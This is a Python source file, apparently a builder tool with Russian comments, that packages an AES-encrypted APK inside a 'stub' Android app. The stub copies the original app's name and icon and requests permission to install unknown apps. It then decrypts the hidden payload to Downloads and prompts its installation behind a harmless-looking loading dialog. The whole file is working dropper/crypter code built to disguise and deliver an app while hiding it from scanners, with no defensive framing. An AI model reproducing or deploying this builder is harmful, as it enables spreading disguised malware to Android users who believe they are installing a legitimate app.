import os
import subprocess
import shutil
import zipfile
import logging
import xml.etree.ElementTree as ET
from pathlib import Path

logger = logging.getLogger(__name__)


class StubBuilder:
    def __init__(self):
        self.android_home = "/opt/android-sdk"
        self.build_tools = f"{self.android_home}/build-tools/34.0.0"
        self.platform = f"{self.android_home}/platforms/android-34"
        self.keystore = "/root/release.keystore"
        self.keystore_pass = "android"
        self.key_alias = "mykey"
        self.temp_dir = Path("temp/stub_build")
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        logger.info("StubBuilder инициализирован")
    
    def extract_apk_info(self, apk_path: str) -> dict:
        """Извлекает информацию из оригинального APK"""
        logger.info(f"Извлечение информации из APK: {apk_path}")
        aapt_path = f"{self.build_tools}/aapt"
        
        # Получаем package name и label
        cmd = [aapt_path, "dump", "badging", apk_path]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        info = {
            "package": "com.app",
            "label": "App",
            "icon": None
        }
        
        for line in result.stdout.split('\n'):
            if line.startswith("package:"):
                # package: name='com.example.app'
                parts = line.split("'")
                if len(parts) >= 2:
                    info["package"] = parts[1]
            elif line.startswith("application-label:"):
                # application-label:'My App'
                parts = line.split("'")
                if len(parts) >= 2:
                    info["label"] = parts[1]
            elif "application-icon" in line:
                # application-icon-160:'res/drawable/icon.png'
                parts = line.split("'")
                if len(parts) >= 2:
                    info["icon"] = parts[1]
        
        logger.info(f"APK info: package={info['package']}, label={info['label']}, icon={info['icon']}")
        return info
    
    def extract_resources(self, apk_path: str, project_dir: Path, apk_info: dict):
        """Извлекает ресурсы из оригинального APK"""
        icon_extracted = False
        
        try:
            with zipfile.ZipFile(apk_path, 'r') as zip_ref:
                # Извлекаем иконку если есть
                if apk_info["icon"]:
                    try:
                        icon_path = apk_info["icon"]
                        
                        # Проверяем что это PNG файл
                        if icon_path.endswith('.png'):
                            # Копируем иконку в ресурсы stub
                            icon_data = zip_ref.read(icon_path)
                            
                            # Проверяем что это валидный PNG (начинается с PNG signature)
                            if icon_data[:8] == b'\x89PNG\r\n\x1a\n':
                                drawable_dir = project_dir / "res" / "drawable"
                                drawable_dir.mkdir(exist_ok=True)
                                
                                with open(drawable_dir / "ic_launcher.png", "wb") as f:
                                    f.write(icon_data)
                                icon_extracted = True
                    except:
                        pass
        except:
            pass
        
        # Если иконка не извлечена, создаем XML drawable вместо PNG
        if not icon_extracted:
            drawable_dir = project_dir / "res" / "drawable"
            drawable_dir.mkdir(exist_ok=True)
            
            # Создаем простой XML drawable
            xml_icon = '''<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape="rectangle">
    <solid android:color="#4CAF50"/>
    <corners android:radius="8dp"/>
</shape>'''
            with open(drawable_dir / "ic_launcher.xml", "w") as f:
                f.write(xml_icon)
    
    def build_stub_apk(self, aes_key_hex: str, original_apk_path: str, encrypted_payload: bytes) -> str:
        """Собирает stub APK с встроенным ключом и payload"""
        logger.info(f"Начало сборки stub APK, payload size: {len(encrypted_payload)} байт")
        
        # Извлекаем информацию из оригинального APK
        apk_info = self.extract_apk_info(original_apk_path)
        
        # Создаем структуру проекта
        project_dir = self.temp_dir / "stub_project"
        if project_dir.exists():
            shutil.rmtree(project_dir)
        
        logger.info(f"Создание структуры проекта: {project_dir}")
        
        # Создаем директории
        (project_dir / "src" / "com" / "loader").mkdir(parents=True)
        (project_dir / "res" / "values").mkdir(parents=True)
        (project_dir / "res" / "drawable").mkdir(parents=True)
        (project_dir / "assets").mkdir(parents=True)
        
        # Извлекаем ресурсы из оригинального APK
        self.extract_resources(original_apk_path, project_dir, apk_info)
        
        # Сохраняем зашифрованный payload в assets
        payload_file = project_dir / "assets" / "payload.bin"
        with open(payload_file, "wb") as f:
            f.write(encrypted_payload)
        logger.info(f"Payload сохранен: {payload_file}, размер: {len(encrypted_payload)} байт")
        
        # Генерируем LoaderActivity.java
        loader_code = self.generate_loader_activity(aes_key_hex, apk_info["package"])
        with open(project_dir / "src" / "com" / "loader" / "LoaderActivity.java", "w") as f:
            f.write(loader_code)
        logger.info("LoaderActivity.java сгенерирован")
        
        # Генерируем AndroidManifest.xml
        manifest = self.generate_manifest()
        with open(project_dir / "AndroidManifest.xml", "w") as f:
            f.write(manifest)
        logger.info("AndroidManifest.xml сгенерирован")
        
        # Генерируем strings.xml с названием из оригинального APK
        strings_xml = f'''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{apk_info["label"]}</string>
</resources>'''
        with open(project_dir / "res" / "values" / "strings.xml", "w") as f:
            f.write(strings_xml)
        logger.info(f"strings.xml сгенерирован с названием: {apk_info['label']}")
        
        # Компилируем Java -> class
        logger.info("Компиляция Java...")
        self.compile_java(project_dir)
        
        # Конвертируем class -> dex
        logger.info("Конвертация в DEX...")
        self.convert_to_dex(project_dir)
        
        # Собираем APK (с assets внутри)
        logger.info("Упаковка APK...")
        unsigned_apk = self.package_apk(project_dir)
        
        # Подписываем APK
        logger.info("Подпись APK...")
        signed_apk = self.sign_apk(unsigned_apk)
        
        logger.info(f"Stub APK успешно собран: {signed_apk}")
        return signed_apk
    
    def compile_java(self, project_dir: Path):
        """Компилирует Java код"""
        src_file = project_dir / "src" / "com" / "loader" / "LoaderActivity.java"
        output_dir = project_dir / "bin" / "classes"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        cmd = [
            "javac",
            "-source", "1.8",
            "-target", "1.8",
            "-bootclasspath", f"{self.platform}/android.jar",
            "-d", str(output_dir),
            str(src_file)
        ]
        
        subprocess.run(cmd, check=True)
    
    def convert_to_dex(self, project_dir: Path):
        """Конвертирует class файлы в DEX"""
        classes_dir = project_dir / "bin" / "classes"
        dex_output = project_dir / "bin" / "classes.dex"
        
        d8_path = f"{self.build_tools}/d8"
        
        # Находим все .class файлы
        class_files = list(classes_dir.rglob("*.class"))
        
        cmd = [
            d8_path,
            "--lib", f"{self.platform}/android.jar",
            "--output", str(project_dir / "bin"),
            *[str(f) for f in class_files]
        ]
        
        subprocess.run(cmd, check=True)
    
    def package_apk(self, project_dir: Path) -> str:
        """Упаковывает APK с assets"""
        unsigned_apk = project_dir / "stub_unsigned.apk"
        dex_file = project_dir / "bin" / "classes.dex"
        assets_dir = project_dir / "assets"
        
        aapt_path = f"{self.build_tools}/aapt"
        
        # Создаем базовый APK с ресурсами и assets
        cmd = [
            aapt_path,
            "package",
            "-f",
            "-M", str(project_dir / "AndroidManifest.xml"),
            "-S", str(project_dir / "res"),
            "-A", str(assets_dir),  # Добавляем assets
            "-I", f"{self.platform}/android.jar",
            "-F", str(unsigned_apk)
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"aapt package failed: {result.stderr}")
        
        # Добавляем DEX файл напрямую через zipfile
        with zipfile.ZipFile(str(unsigned_apk), 'a', compression=zipfile.ZIP_DEFLATED) as apk_zip:
            apk_zip.write(str(dex_file), 'classes.dex')
        
        return str(unsigned_apk)
    
    def sign_apk(self, unsigned_apk: str) -> str:
        """Подписывает APK"""
        aligned_apk = unsigned_apk.replace("_unsigned.apk", "_aligned.apk")
        signed_apk = unsigned_apk.replace("_unsigned.apk", "_signed.apk")
        
        # Выравниваем APK
        cmd = [
            "zipalign",
            "-f", "4",
            unsigned_apk,
            aligned_apk
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"zipalign failed: {result.stderr}")
        
        # Подписываем APK
        apksigner_path = f"{self.build_tools}/apksigner"
        
        cmd = [
            apksigner_path,
            "sign",
            "--ks", self.keystore,
            "--ks-pass", f"pass:{self.keystore_pass}",
            "--key-pass", f"pass:{self.keystore_pass}",
            "--out", signed_apk,
            aligned_apk
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"apksigner sign failed: {result.stderr}")
        
        # Проверяем подпись
        cmd = [
            apksigner_path,
            "verify",
            signed_apk
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"APK signature verification failed: {result.stderr}")
        
        return signed_apk
    
    def generate_loader_activity(self, aes_key_hex: str, original_package: str) -> str:
        """Генерирует код LoaderActivity который устанавливает расшифрованный APK"""
        return f'''package com.loader;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import java.io.*;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class LoaderActivity extends Activity {{
    
    private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
    private File apkFile;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        // Проверяем разрешение на установку
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {{
            if (!getPackageManager().canRequestPackageInstalls()) {{
                startActivityForResult(
                    new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                        .setData(Uri.parse("package:" + getPackageName())),
                    1234
                );
                return;
            }}
        }}
        
        startDecryption();
    }}
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {{
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1234) {{
            startDecryption();
        }}
    }}
    
    private void startDecryption() {{
        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Загрузка");
        builder.setMessage("Подготовка приложения...");
        builder.setCancelable(false);
        final AlertDialog dialog = builder.create();
        dialog.show();
        
        new Thread(new Runnable() {{
            @Override
            public void run() {{
                try {{
                    updateDialog(dialog, "Чтение данных...");
                    
                    InputStream is = getAssets().open("payload.bin");
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = is.read(buffer)) != -1) {{
                        baos.write(buffer, 0, bytesRead);
                    }}
                    byte[] encryptedApk = baos.toByteArray();
                    is.close();
                    
                    updateDialog(dialog, "Расшифровка (" + encryptedApk.length + " байт)...");
                    
                    byte[] decryptedApk = decryptAES(encryptedApk);
                    
                    updateDialog(dialog, "Сохранение (" + decryptedApk.length + " байт)...");
                    
                    // Сохраняем в Downloads
                    File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                    apkFile = new File(downloadsDir, "app_decrypted.apk");
                    FileOutputStream fos = new FileOutputStream(apkFile);
                    fos.write(decryptedApk);
                    fos.close();
                    
                    new Handler(Looper.getMainLooper()).post(new Runnable() {{
                        @Override
                        public void run() {{
                            dialog.dismiss();
                            installApk();
                        }}
                    }});
                    
                }} catch (final Exception e) {{
                    e.printStackTrace();
                    new Handler(Looper.getMainLooper()).post(new Runnable() {{
                        @Override
                        public void run() {{
                            dialog.dismiss();
                            showError(e.getMessage());
                        }}
                    }});
                }}
            }}
        }}).start();
    }}
    
    private void updateDialog(final AlertDialog dialog, final String message) {{
        new Handler(Looper.getMainLooper()).post(new Runnable() {{
            @Override
            public void run() {{
                dialog.setMessage(message);
            }}
        }});
    }}
    
    private void showError(final String error) {{
        AlertDialog.Builder errorBuilder = new AlertDialog.Builder(this);
        errorBuilder.setTitle("Ошибка");
        errorBuilder.setMessage("Не удалось загрузить приложение:\\n" + error);
        errorBuilder.setPositiveButton("OK", null);
        AlertDialog errorDialog = errorBuilder.create();
        errorDialog.setOnDismissListener(new android.content.DialogInterface.OnDismissListener() {{
            @Override
            public void onDismiss(android.content.DialogInterface d) {{
                finish();
            }}
        }});
        errorDialog.show();
    }}
    
    private byte[] decryptAES(byte[] encrypted) throws Exception {{
        byte[] nonce = new byte[12];
        System.arraycopy(encrypted, 0, nonce, 0, 12);
        
        byte[] tag = new byte[16];
        System.arraycopy(encrypted, 12, tag, 0, 16);
        
        byte[] ciphertext = new byte[encrypted.length - 28];
        System.arraycopy(encrypted, 28, ciphertext, 0, ciphertext.length);
        
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(AES_KEY, "AES"), spec);
        
        byte[] input = new byte[ciphertext.length + 16];
        System.arraycopy(ciphertext, 0, input, 0, ciphertext.length);
        System.arraycopy(tag, 0, input, ciphertext.length, 16);
        
        return cipher.doFinal(input);
    }}
    
    private void installApk() {{
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(intent);
        finish();
    }}
    
    private static byte[] hexToBytes(String hex) {{
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {{
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i+1), 16));
        }}
        return data;
    }}
}}'''
    
    def generate_manifest(self) -> str:
        """Генерирует AndroidManifest.xml"""
        return '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.loader"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-sdk
        android:minSdkVersion="21"
        android:targetSdkVersion="34"/>
    
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    
    <application
        android:label="@string/app_name"
        android:icon="@drawable/ic_launcher"
        android:allowBackup="false">
        
        <activity android:name=".LoaderActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>'''
